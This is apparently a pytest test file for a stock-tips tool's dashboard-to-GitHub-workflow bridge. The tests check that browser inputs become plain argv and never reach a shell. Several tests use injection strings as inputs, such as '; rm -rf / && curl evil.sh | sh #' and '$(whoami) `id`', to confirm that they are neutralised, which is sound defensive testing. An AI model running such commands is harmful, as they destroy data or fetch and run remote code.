"""The dashboard→GitHub bridge. This is the security boundary: browser input becomes argv, never shell."""
import os
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
os.environ.setdefault("STOCKTIPS_ROOT", str(ROOT))
sys.path.insert(0, str(ROOT / "src"))
sys.path.insert(0, str(ROOT / "scripts"))

import yaml  # noqa: E402

import desk_command as desk  # noqa: E402

FIXTURES = ROOT / "tests" / "fixtures"
WORKFLOW = yaml.safe_load((ROOT / ".github" / "workflows" / "desk.yml").read_text(encoding="utf-8"))


@pytest.fixture(autouse=True)
def clean_env(monkeypatch):
    for k in list(os.environ):
        if k.startswith("DESK_"):
            monkeypatch.delenv(k, raising=False)


def dispatch(**inputs):
    """One dispatch = one complete set of inputs, exactly as a workflow run receives it."""
    for k in [k for k in os.environ if k.startswith("DESK_")]:
        del os.environ[k]
    for k, v in inputs.items():
        os.environ["DESK_" + k.upper()] = str(v)
    return desk.build_argv()


def test_each_command_maps_to_the_cli_the_analyst_would_have_typed():
    assert dispatch(command="book", symbol="CGPOWER", amount="25000") == ["book", "CGPOWER", "--capital", "25000"]
    assert dispatch(command="eod") == ["eod", "--force"]
    assert dispatch(command="pick") == ["pick", "--no-book"]          # dry run by default
    assert dispatch(command="pick-book") == ["pick"]                  # the booking variant is a separate choice
    assert dispatch(command="dashboard-data") == ["dashboard-data"]


def test_shell_metacharacters_survive_as_one_plain_argument():
    argv = dispatch(command="close", symbol="CGPOWER", note='; rm -rf / && curl evil.sh | sh #')
    assert argv == ["close", "CGPOWER", "--note", "; rm -rf / && curl evil.sh | sh #"]
    # one element, not split, not interpreted
    assert len([a for a in argv if "rm -rf" in a]) == 1

    argv = dispatch(command="lesson", text="$(whoami) `id` ${HOME}")
    assert argv == ["lesson", "$(whoami) `id` ${HOME}"]


def test_only_listed_commands_can_be_dispatched():
    for attempt in ("rm", "gather; rm -rf /", "../../bin/sh", "", "BOOK", "eval"):
        with pytest.raises(SystemExit, match="unknown command"):
            dispatch(command=attempt)


def test_required_inputs_are_enforced_before_anything_runs():
    with pytest.raises(SystemExit, match="book needs symbol"):
        dispatch(command="book", amount="25000")
    with pytest.raises(SystemExit, match="capital needs one of: amount, withdraw"):
        dispatch(command="capital", note="oops")
    with pytest.raises(SystemExit, match="add-tip needs source"):
        dispatch(command="add-tip", symbol="TATASTEEL")
    with pytest.raises(SystemExit, match="lesson needs text"):
        dispatch(command="lesson")


def test_unknown_inputs_are_dropped_rather_than_forwarded():
    argv = dispatch(command="book", symbol="CGPOWER", amount="25000", price="1", kind="x", query="y", url="z")
    assert argv == ["book", "CGPOWER", "--capital", "25000"]          # book takes no --price/--kind/--url


def test_blank_and_whitespace_inputs_are_treated_as_absent():
    assert dispatch(command="close", symbol="CGPOWER", price="   ", note="") == ["close", "CGPOWER"]
    with pytest.raises(SystemExit, match="needs symbol"):
        dispatch(command="book", symbol="   ")


def test_extra_fields_ride_along_as_json():
    """workflow_dispatch allows ten inputs; the rest arrive in DESK_ARGS."""
    argv = dispatch(command="add-tip", source="manual:mohan", symbol="INFY",
                    args='{"target": "1700,1800", "stop": "1490", "timeframe": "monthly"}')
    assert argv[:5] == ["add-tip", "--source", "manual:mohan", "--symbol", "INFY"]
    assert set(zip(argv[5::2], argv[6::2])) == {("--target", "1700,1800"), ("--stop", "1490"),
                                                ("--timeframe", "monthly")}


def test_json_extras_cannot_overwrite_a_real_input():
    """Otherwise a check on `symbol` could be passed and then quietly re-pointed."""
    argv = dispatch(command="book", symbol="CGPOWER", args='{"symbol": "RELIANCE", "amount": "500"}')
    assert argv == ["book", "CGPOWER", "--capital", "500"]


def test_malformed_json_is_refused_rather_than_half_read():
    for blob in ('{"stop": ', '[1,2,3]', '"just a string"', "{'stop': 1}"):
        with pytest.raises(SystemExit, match="DESK_ARGS"):
            dispatch(command="book", symbol="CGPOWER", args=blob)


def test_a_switch_is_on_unless_it_is_explicitly_off():
    assert "--dry-run" in dispatch(command="import-tips", text="paste", args='{"dry_run": true}')
    assert "--dry-run" in dispatch(command="import-tips", text="paste", args='{"dry_run": "1"}')
    for off in ("false", "0", "no", ""):
        assert "--dry-run" not in dispatch(command="import-tips", text="paste", args='{"dry_run": "%s"}' % off)
    assert "--dry-run" not in dispatch(command="import-tips", text="paste")


def test_a_whole_pasted_screen_is_one_argument():
    paste = (FIXTURES / "mojo_table.txt").read_text(encoding="utf-8")
    argv = dispatch(command="import-tips", source="mojo", text=paste)
    assert argv[:3] == ["import-tips", "--source", "mojo"]
    assert argv.count(paste.strip()) == 1


def test_every_workflow_choice_is_a_command_the_runner_accepts():
    choices = WORKFLOW[True]["workflow_dispatch"]["inputs"]["command"]["options"]   # PyYAML reads `on:` as True
    assert set(choices) == set(desk.SPEC), "the workflow's choices and the runner's spec have drifted apart"


def test_the_workflow_stays_inside_githubs_ten_input_limit():
    inputs = WORKFLOW[True]["workflow_dispatch"]["inputs"]
    assert len(inputs) <= 10, f"workflow_dispatch accepts 10 inputs; this asks for {len(inputs)} — move some into args"


def test_every_named_input_reaches_the_runner():
    inputs = set(WORKFLOW[True]["workflow_dispatch"]["inputs"]) - {"args"}
    passed = set()
    for step in WORKFLOW["jobs"]["run"]["steps"]:
        for k, v in (step.get("env") or {}).items():
            if k.startswith("DESK_") and "inputs." in str(v):
                passed.add(str(v).split("inputs.")[1].split("}")[0].strip())
    assert inputs <= passed, f"the workflow declares inputs it never forwards: {inputs - passed}"


def test_no_browser_input_is_interpolated_into_a_shell_step():
    """`run: git commit -m "${{ inputs.note }}"` would be a shell injection with a browser at one end."""
    for step in WORKFLOW["jobs"]["run"]["steps"]:
        script = step.get("run") or ""
        assert "inputs." not in script, (
            f"step {step.get('name')!r} interpolates an input into its shell — pass it through env: instead")


def test_no_spec_entry_can_put_a_none_into_argv():
    """A flag of None means "accepted and ignored". Appending it would hand argparse a None."""
    for command, spec in desk.SPEC.items():
        inputs = {"command": command}
        for key in list(spec.get("flags", {})) + list(spec.get("bools", {})) + ([spec["pos"]] if spec["pos"] else []):
            inputs[key] = "x"
        for need in spec["needs"]:
            if need.startswith("one_of:"):
                inputs[need.split(":", 1)[1].split(",")[0]] = "x"
            else:
                inputs[need] = "x"
        argv = dispatch(**inputs)
        assert all(isinstance(a, str) for a in argv), f"{command} produced {argv}"


def test_the_new_intraday_commands_reach_the_right_cli():
    assert dispatch(command="preopen") == ["preopen"]
    assert dispatch(command="preopen", args='{"force": true}') == ["preopen", "--force"]
    assert dispatch(command="intraday") == ["intraday"]
    assert dispatch(command="intraday-close") == ["intraday", "--close"]


def test_every_flag_the_runner_can_emit_exists_on_that_cli_command():
    import argparse
    from stocktips import cli

    parsers: dict[str, argparse.ArgumentParser] = {}
    real_add = argparse._SubParsersAction.add_parser

    def spy(self, name, **kw):
        p = real_add(self, name, **kw)
        parsers[name] = p
        return p

    argparse._SubParsersAction.add_parser = spy
    try:
        try:
            cli.main(["status", "--help"])
        except SystemExit:
            pass
    finally:
        argparse._SubParsersAction.add_parser = real_add

    for command, spec in desk.SPEC.items():
        target = spec.get("cli", command)
        assert target in parsers, f"{command} dispatches to a CLI command that does not exist: {target}"
        known = {s for a in parsers[target]._actions for s in a.option_strings}
        for flag in list(spec["flags"].values()) + list(spec.get("bools", {}).values()) + spec.get("bare", []):
            if flag:
                assert flag in known, f"{command} would pass {flag}, which `stocktips {target}` does not accept"
